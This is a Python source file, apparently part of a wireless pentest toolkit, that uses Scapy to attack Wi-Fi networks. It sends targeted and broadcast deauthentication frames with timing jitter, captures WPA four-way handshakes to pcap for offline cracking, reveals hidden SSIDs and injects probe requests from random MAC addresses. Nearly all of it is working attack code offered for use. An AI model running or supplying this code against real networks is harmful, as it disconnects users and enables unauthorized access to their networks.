"""Native packet operations with Scapy — deauth, beacon, probe, handshake parsing."""

from __future__ import annotations

import random
import time
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

console = Console()

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
        Dot11ProbeReq, Dot11ProbeResp, Dot11Auth, Dot11AssoReq,
        EAPOL, sendp, sniff, wrpcap, conf,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class BeaconInfo:
    bssid: str
    essid: str
    channel: int
    encryption: str
    power: int


def check_scapy() -> bool:
    if not SCAPY_AVAILABLE:
        console.print("[red]Scapy not available — install with: pip install scapy[/red]")
    return SCAPY_AVAILABLE


def deauth(
    interface: str,
    target_mac: str,
    ap_mac: str,
    count: int = 3,
    interval: float = 0.1,
    jitter: bool = True,
) -> int:
    if not check_scapy():
        return 0

    console.print(
        f"[yellow]Sending {count} deauth frames: "
        f"{target_mac} ↔ {ap_mac}[/yellow]"
    )

    pkt_to_client = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )
    pkt_to_ap = (
        RadioTap() /
        Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    sent = 0
    for i in range(count):
        sendp(pkt_to_client, iface=interface, verbose=False)
        sendp(pkt_to_ap, iface=interface, verbose=False)
        sent += 2

        if jitter:
            time.sleep(interval + random.uniform(0, interval * 0.5))
        else:
            time.sleep(interval)

    console.print(f"[dim]Sent {sent} deauth frames[/dim]")
    return sent


def deauth_broadcast(
    interface: str,
    ap_mac: str,
    count: int = 5,
    interval: float = 0.1,
) -> int:
    if not check_scapy():
        return 0

    pkt = (
        RadioTap() /
        Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    sent = 0
    for _ in range(count):
        sendp(pkt, iface=interface, verbose=False)
        sent += 1
        time.sleep(interval)

    return sent


def scan_beacons(
    interface: str,
    duration: int = 30,
    channel: int | None = None,
) -> list[BeaconInfo]:
    if not check_scapy():
        return []

    beacons: dict[str, BeaconInfo] = {}

    def process_packet(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr2
        if bssid in beacons:
            return

        essid = ""
        channel = 0
        encryption = "OPEN"

        stats = pkt[Dot11Beacon].network_stats()
        if stats:
            essid = stats.get("ssid", "")
            channel = stats.get("channel", 0)
            crypto = stats.get("crypto", set())
            if crypto:
                encryption = "/".join(crypto)

        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 0:
                try:
                    essid = elt.info.decode("utf-8", errors="ignore")
                except Exception:
                    pass
            elif elt.ID == 3:
                try:
                    channel = int.from_bytes(elt.info, "big")
                except Exception:
                    pass
            elt = elt.payload if hasattr(elt.payload, "ID") else None

        power = getattr(pkt, "dBm_AntSignal", -100) if hasattr(pkt, "dBm_AntSignal") else -100

        beacons[bssid] = BeaconInfo(
            bssid=bssid, essid=essid, channel=channel,
            encryption=encryption, power=power,
        )

    with Progress(
        SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(), console=console,
    ) as progress:
        progress.add_task(f"Sniffing beacons ({duration}s)...", total=None)
        sniff(
            iface=interface, prn=process_packet,
            timeout=duration, store=False,
        )

    console.print(f"[green]Captured {len(beacons)} unique beacons[/green]")
    return list(beacons.values())


def capture_handshake(
    interface: str,
    bssid: str,
    output_file: str,
    timeout: int = 120,
) -> bool:
    if not check_scapy():
        return False

    handshake_packets = []
    eapol_count = 0

    def process_packet(pkt):
        nonlocal eapol_count
        if pkt.haslayer(EAPOL):
            if pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid:
                handshake_packets.append(pkt)
                eapol_count += 1
                console.print(f"[green]EAPOL frame {eapol_count}/4 captured[/green]")

    with Progress(
        SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(), console=console,
    ) as progress:
        progress.add_task(f"Capturing handshake for {bssid}...", total=None)
        sniff(
            iface=interface,
            prn=process_packet,
            timeout=timeout,
            store=False,
            lfilter=lambda p: p.haslayer(Dot11) and (
                p[Dot11].addr1 == bssid or p[Dot11].addr2 == bssid
            ),
        )

    if eapol_count >= 2:
        wrpcap(output_file, handshake_packets)
        console.print(f"[green bold]Handshake captured → {output_file}[/green bold]")
        return True

    console.print("[yellow]Incomplete handshake[/yellow]")
    return False


def detect_hidden_ssid(
    interface: str,
    bssid: str,
    duration: int = 60,
) -> str | None:
    if not check_scapy():
        return None

    found_ssid = None

    def process_packet(pkt):
        nonlocal found_ssid
        if found_ssid:
            return

        if pkt.haslayer(Dot11ProbeResp):
            if pkt[Dot11].addr2 == bssid:
                elt = pkt[Dot11ProbeResp].payload
                if hasattr(elt, "ID") and elt.ID == 0:
                    try:
                        ssid = elt.info.decode("utf-8", errors="ignore")
                        if ssid:
                            found_ssid = ssid
                            console.print(f"[green bold]Hidden SSID revealed: {ssid}[/green bold]")
                    except Exception:
                        pass

    sniff(
        iface=interface, prn=process_packet,
        timeout=duration, store=False,
    )

    return found_ssid


def inject_probe_request(
    interface: str,
    essid: str,
    source_mac: str | None = None,
) -> None:
    if not check_scapy():
        return

    if not source_mac:
        source_mac = f"00:{random.randint(0,255):02x}:{random.randint(0,255):02x}:" \
                     f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"

    pkt = (
        RadioTap() /
        Dot11(
            type=0, subtype=4,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=source_mac,
            addr3="ff:ff:ff:ff:ff:ff",
        ) /
        Dot11ProbeReq() /
        Dot11Elt(ID=0, info=essid.encode())
    )

    sendp(pkt, iface=interface, verbose=False)
